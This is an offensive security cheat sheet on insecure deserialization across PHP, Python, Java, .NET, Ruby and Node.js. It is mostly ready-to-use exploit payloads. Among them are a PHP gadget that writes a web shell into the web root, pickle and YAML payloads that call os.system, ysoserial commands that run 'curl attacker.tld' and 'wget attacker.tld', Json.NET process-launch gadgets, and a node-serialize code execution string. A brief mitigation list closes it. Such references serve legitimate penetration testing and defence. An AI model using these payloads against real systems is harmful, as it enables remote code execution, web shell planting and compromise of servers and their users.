# Insecure Deserialization

> Deserialization of attacker-controlled data can lead to authentication bypass, denial of service, or remote code execution, depending on the language and available gadget chains.

## Summary

- [Detection](#detection)
- [PHP](#php)
- [Python (pickle)](#python-pickle)
- [Java](#java)
- [.NET](#net)
- [Ruby](#ruby)
- [Node.js](#nodejs)
- [Mitigation](#mitigation)
- [References](#references)

## Detection

Look for serialized blobs in cookies, hidden fields, request bodies, URL parameters:

| Format | Indicator |
|--------|-----------|
| PHP | `a:2:{...}`, `O:8:"stdClass":1:{...}` |
| Python pickle | starts with `\x80\x04`, `gASV...`, base64 → magic bytes |
| Java | `rO0AB` (base64 of `\xac\xed\x00\x05`) |
| .NET BinaryFormatter | `AAEAAAD/////AQAAAAAA` (base64) |
| .NET JSON.NET | `"$type":"…"` |
| Ruby Marshal | `\x04\x08` (base64: `BAg`) |
| Node — `node-serialize` | `_$$ND_FUNC$$_` |

## PHP

### Magic methods triggered

| Method | When |
|--------|------|
| `__wakeup()` | on `unserialize()` |
| `__destruct()` | on object destruction |
| `__toString()` | on string cast |
| `__call()` | on undefined method |
| `__get()` / `__set()` | property access |
| `__invoke()` | object called as function |

### Generic POP chain workflow

1. Identify which classes are autoloaded (composer's `autoload.php`).
2. Use [PHPGGC](https://github.com/ambionics/phpggc) to generate a chain:

```bash
phpggc Monolog/RCE1 system 'id' -b
phpggc Laravel/RCE9 'id' -b
phpggc Symfony/RCE4 system 'id'
```

3. Submit the blob where `unserialize()` is called.

### Hand-crafted example

```php
class Logger {
    public $file;
    public $contents;
    function __destruct() {
        file_put_contents($this->file, $this->contents);
    }
}
$o = new Logger();
$o->file = '/var/www/html/shell.php';
$o->contents = '<?php system($_GET["c"]); ?>';
echo serialize($o);
```

### Phar deserialization

If user input reaches a filesystem function (`file_exists`, `file_get_contents`, `unlink`, etc.), `phar://`-prefixed paths trigger metadata deserialization.

```
phar://uploaded.phar
phar://uploaded.jpg            (extension irrelevant)
phar://uploaded.phar/.fake-file
```

Build:

```php
$p = new Phar('exploit.phar', 0, 'exploit.phar');
$p->startBuffering();
$p->addFromString('test.txt', 'test');
$p->setMetadata($maliciousObject);
$p->setStub('<?php __HALT_COMPILER(); ?>');
$p->stopBuffering();
```

Then rename to `exploit.jpg` and upload.

## Python (pickle)

> Pickle is **inherently unsafe** with untrusted input.

### Classic RCE pickle

```python
import pickle, os, base64
class P:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(P())).decode())
```

Common entry points: cookies, `pickle.loads` on session blobs, Celery messages, `joblib.load`, `numpy.load(allow_pickle=True)`, `torch.load`, `yaml.load` without `SafeLoader`.

### YAML

```yaml
!!python/object/apply:os.system ["id"]
!!python/object/new:subprocess.check_output [["id"]]
```

## Java

### Detection

```
rO0AB...                           # base64 magic
http://target/path   <-- with Content-Type: application/x-java-serialized-object
```

### ysoserial

```bash
java -jar ysoserial.jar CommonsCollections5 'curl attacker.tld' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'wget attacker.tld'
java -jar ysoserial.jar Spring1 'id'
java -jar ysoserial.jar Hibernate1 'id'
java -jar ysoserial.jar URLDNS 'http://attacker.tld'        # safe blind probe
```

### URLDNS — non-destructive probe

`URLDNS` triggers a DNS lookup during deserialization — perfect for blind detection without side effects:

```bash
java -jar ysoserial.jar URLDNS http://random.interactsh.tld | base64 -w0
```

### Targets to fingerprint

- JBoss / WildFly `/invoker/JMXInvokerServlet`
- WebLogic T3 / IIOP
- Jenkins CLI (`/cli`)
- WebSphere SOAP
- Spring HTTP Invoker

## .NET

### BinaryFormatter / NetDataContractSerializer / SoapFormatter

Generate gadgets with [ysoserial.net](https://github.com/pwntester/ysoserial.net):

```
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc"
ysoserial.exe -g WindowsIdentity -f Json.Net -c "calc"
ysoserial.exe -g TextFormattingRunProperties -f Xaml -c "calc"
```

### JSON.NET with `TypeNameHandling`

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c calc"]
  },
  "ObjectInstance": {"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}
```

### ViewState

If MAC validation is disabled or the key is leaked (Machine Key disclosure):

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path="/page" --apppath="/" --decryptionalg="AES" --decryptionkey="..." --validationalg="SHA1" --validationkey="..."
```

## Ruby

```ruby
require 'erb'
e = ERB.allocate
e.instance_variable_set :@src, "system('id')"
e.instance_variable_set :@lineno, 1
$gadget = e
Marshal.dump($gadget)
```

Rails-specific gadgets: [Universal Deserialization Gadget for Ruby](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html).

## Node.js

### `node-serialize` (legacy, vulnerable by design)

```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
```

### `funcster`, `serialize-to-js`, `cryo`

Each has documented RCE patterns. Search advisories for the exact version.

### Prototype Pollution → RCE chain

See [../Prototype Pollution/](../Prototype%20Pollution/) — pollution gadgets in `lodash`, `merge`, `set` lead to RCE when downstream code uses `child_process.spawn` with default args, etc.

## Mitigation

- **Don't deserialize untrusted data.** Use JSON / Protocol Buffers / msgpack with explicit schemas.
- If you must, use **allow-listed types** (`ObjectInputFilter` in Java 9+, `SerializationBinder` in .NET).
- Sign the blob with HMAC and verify before deserializing.
- Patch frameworks aggressively — gadget chains are discovered constantly.

## References

- [OWASP — Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [PortSwigger — Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [PHPGGC](https://github.com/ambionics/phpggc)
- [ysoserial](https://github.com/frohoff/ysoserial)
- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
